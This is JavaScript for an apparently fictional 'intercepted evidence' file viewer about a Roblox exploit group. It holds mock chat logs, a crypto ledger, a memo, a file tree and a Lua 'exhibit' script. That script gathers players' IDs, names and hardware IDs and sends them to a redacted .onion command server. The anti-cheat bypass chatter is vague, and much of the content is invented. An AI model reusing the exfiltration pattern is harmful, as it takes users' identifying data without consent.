document.addEventListener('DOMContentLoaded', () => {
    const sysTimeEl = document.getElementById('sys-time');
    const authOverlay = document.getElementById('auth-overlay');
    const authStatus = document.getElementById('auth-status');
    const mainContent = document.getElementById('main-content');
    const btnAgree = document.getElementById('btn-agree');
    const btnDecline = document.getElementById('btn-decline');

    const fileGrid = document.getElementById('file-grid');
    const searchBox = document.querySelector('.search-box');

    // Modal Elements
    const modal = document.getElementById('file-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalText = document.getElementById('modal-text');
    const modalDocId = document.getElementById('modal-doc-id');
    const btnClose = document.getElementById('close-modal');

    // Update System Time
    setInterval(() => {
        const now = new Date();
        sysTimeEl.textContent = `SYS_TIME: ${now.toISOString().replace('T', ' ').substring(0, 19)} UTC`;
    }, 1000);

    // Authentication Flow
    btnDecline.addEventListener('click', () => {
        authStatus.classList.remove('hidden');
        authStatus.style.color = 'red';
        authStatus.textContent = 'ACCESS DENIED. CONNECTION TERMINATED.';
        setTimeout(() => {
            document.body.innerHTML = '<h1 style="color:red; text-align:center; margin-top: 20%; font-family: monospace;">CONNECTION REFUSED</h1>';
        }, 1500);
    });

    btnAgree.addEventListener('click', () => {
        authStatus.classList.remove('hidden');
        authStatus.style.color = '#00ff00';
        authStatus.textContent = 'AUTHENTICATING CIPHER... WAIT';

        btnAgree.disabled = true;
        btnDecline.disabled = true;

        setTimeout(() => {
            authStatus.textContent = 'CREDENTIALS VERIFIED. ACCESS GRANTED.';
            setTimeout(() => {
                authOverlay.classList.add('hidden');
                mainContent.classList.remove('hidden');
            }, 800);
        }, 1500);
    });

    // Mock Database Files
    const files = [
        {
            id: 'DOC-001',
            name: '01_discord_logs_redacted.txt',
            type: 'TEXT LOG',
            size: '14.2 KB',
            content: `INTERCEPTED COMMUNICATIONS - OPERATION BROKEN LUA
=================================================
DATE: 2023-11-14
TARGET: Discord Server "SirHurt Devs"
CHANNEL: #general
-------------------------------------------------

[14:02] <Redacted> : Are we pushing the new Lua executor update tonight?
[14:03] <spook> : Yea but we need to bypass the new <REDACTED> anti-cheat first.
[14:04] <User099> : I thought the last bypass got patched in 2 hours lol.
[14:05] <spook> : <REDACTED> sent me a new hook via DM. It's fully undetected.
[14:06] <Redacted> : Cool. Just make sure to scrub the IPs before dropping the payload.
[14:10] <User099> : BTW did anyone see the FBI warning going around?
[14:11] <spook> : Lmao they don't care about a lego game exploit. We're fine.

=================================================
* END OF LOG TRANCRIPT *
INVESTIGATOR NOTE: Subject seems unaware of ongoing federal monitoring.`
        },
        {
            id: 'DOC-002',
            name: '02_financial_ledger.csv',
            type: 'FINANCIAL',
            size: '5.8 KB',
            content: `BTC_WALLET,AMOUNT_USD,DATE,NOTES
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa,1450.00,2023-10-01,Premium Subscriptions (Sept)
bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq,890.00,2023-10-05,Script Hub Access
3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy,2100.00,2023-10-12,<REDACTED> - Payment for Source
1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2,500.00,2023-10-15,Server Hosting Anonymous
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh,3300.00,2023-10-22,Wholesale License Keys

* AGENT MEMO: Cryptographic analysis links the second wallet address to a known dark-web hosting provider. Subpoena pending.`
        },
        {
            id: 'DOC-003',
            name: '03_internal_company_memo.txt',
            type: 'TEXT MEMO',
            size: '2.1 KB',
            content: `TO: All SirHurt Staff
FROM: Project Lead
DATE: CONFIDENTIAL / UNKNOWN
SUBJECT: SECURITY PROTOCOL UPDATE

Listen up everyone. We've had some concerning reports that one of our old domains has been seized or flagged by authorities. 

Effective immediately:
1. Move all main repositories to the offshore servers.
2. Use the encrypted signal chats ONLY for development talk. Discord is for PR and support.
3. If anyone asks, we are merely an "educational reverse engineering team". Do NOT use the word "exploit" or "hacking" in public channels anymore.

I know some of you think this is paranoid, but better safe than locked up. Keep pushing the v5 beta.

- SL`
        },
        {
            id: 'DOC-004',
            name: '04_scripting_evidence.lua',
            type: 'CODE EXHIBIT',
            size: '1.2 KB',
            content: `-- CONFIDENTIAL EVIDENTIARY FILE
-- SEIZED DURING RAID ON SERVER INFRASTRUCTURE
-- AUTHOR: <REDACTED>

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local function grab_data(player)
    local data = {
        userId = player.UserId,
        name = player.Name,
        hwid = gethwid() -- Custom executor function
    }
    
    -- Send to C&C
    local response = request({
        Url = "https://<REDACTED>.onion/api/log",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
    
    if response.StatusCode == 200 then
        print("Logged successfully.")
    end
end

-- ANALYST NOTE: Malicious telemetry script explicitly logging hardware IDs and routing them through a tor proxy. This violates CFAA.`
        },
        {
            id: 'DOC-005',
            name: '05_sirhurt_v5.670_structure.txt',
            type: 'FILE TREE LOG',
            size: '0.8 KB',
            content: `INTERCEPTED FILE TREE - PROJECT "SIRHURT V5"
DATE: 2026-01-18
=================================================

SirHurt_v5_Source/
├── Backend/
│   ├── AuthServer/
│   │   ├── hwid_manager.cpp
│   │   ├── token_gen.rs
│   │   ├── _db_connect.js <REDACTED_CREDENTIALS>
│   │   └── account_trafficking.py
│   └── API/
│       ├── scripts_endpoint.go
│       ├── remote_access_trojan.go
│       └── telemetry_receiver.go
├── Executor/
│   ├── Injection/
│   │   ├── thread_hijack.asm
│   │   ├── map_dll.cpp
│   │   ├── epstein_summoner.asm
│   │   └── bypass_hyperion.cpp
│   ├── Environment/
│   │   ├── custom_functions.lua
│   │   ├── drawing_lib.lua
│   │   ├── skidded_decompiler.lua
│   │   ├── replicatesignal.cpp
│   │   └── hookmetamethod.cpp
│   └── UI/
│       ├── ImGui_Menu.cpp
│       └── themes/
└── Scripts/
    ├── Hub/
    │   └── epstein_hub.lua
    └── AutoExec/
        └── init.lua

=================================================
INVESTIGATOR NOTE: Reverse engineering of bypass_hyperion.cpp is currently underway by the Cyber Division.`
        },
        {
            id: 'DOC-006',
            name: '06_comms_intercept_hyperion.log',
            type: 'DISCORD CHAT DUMP',
            size: '2.5 KB',
            content: `INTERCEPTED COMMUNICATIONS - TARGET: SPOOK
DATE: 2026-02-10
CHANNEL: Private DM
-------------------------------------------------

[23:45] <RandomUser1337> : hey spook, hyperion v67 just dropped, sirhurt is crashing instantly on inject
[23:46] <Spook> : yeah im aware. bitdancer pushed a quiet update it seems.
[23:47] <Spook> : give me an hour, im looking at the dumps right now.
[23:55] <RandomUser1337> : any luck? people in general chat are freaking out
[23:58] <Spook> : lmfao this is actually pathetic
[23:58] <Spook> : they just added a new integrity check on the text section but they forgot to hash the new address space properly
[00:02] <Spook> : alright i bypassed it. 
[00:03] <RandomUser1337> : bro you're insane, how did you do it that fast?
[00:05] <Spook> : it's hyperion v67 but it's literally the same logic as v64 just shifted. I just updated the signature scanner and patched the return address before the integrity check runs.
[00:06] <Spook> : pushing v5.670 update to the bootstrapper now. tell everyone to restart their clients.
[00:08] <RandomUser1337> : bet, sirhurt on top

-------------------------------------------------
* END OF LOG TRANCRIPT *
INVESTIGATOR NOTE: The agility of the threat actors in bypassing corporate anti-tamper mechanisms (Project Hyperion v67) poses a continuous operational hazard. Additional monitoring authorized.`
        }
    ];

    // Render Grid
    function renderGrid(filter = '') {
        fileGrid.innerHTML = '';
        const filtered = files.filter(f => f.name.toLowerCase().includes(filter.toLowerCase()));

        filtered.forEach(f => {
            const card = document.createElement('div');
            card.className = 'file-card';
            card.innerHTML = `
                <div class="file-icon">🗄️</div>
                <div class="file-details">
                    <h4>${f.name}</h4>
                    <p>TYPE: ${f.type} | SIZE: ${f.size}</p>
                </div>
            `;

            card.addEventListener('click', () => openModal(f));
            fileGrid.appendChild(card);
        });
    }

    // Modal Logic
    function openModal(fileObj) {
        modalTitle.textContent = fileObj.name;
        modalDocId.textContent = `DOC ID: ${fileObj.id}`;

        // Add redacted styling for words wrapped in <REDACTED>
        let safeContent = fileObj.content.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        safeContent = safeContent.replace(/&lt;REDACTED&gt;/g, '<span class="redacted">[REDACTED]</span>');

        modalText.innerHTML = safeContent;
        modal.classList.remove('hidden');
    }

    btnClose.addEventListener('click', () => {
        modal.classList.add('hidden');
    });

    // Close on clicking outside the content
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.add('hidden');
        }
    });

    // Search
    searchBox.addEventListener('input', (e) => {
        renderGrid(e.target.value);
    });

    // Initial render
    renderGrid();
});
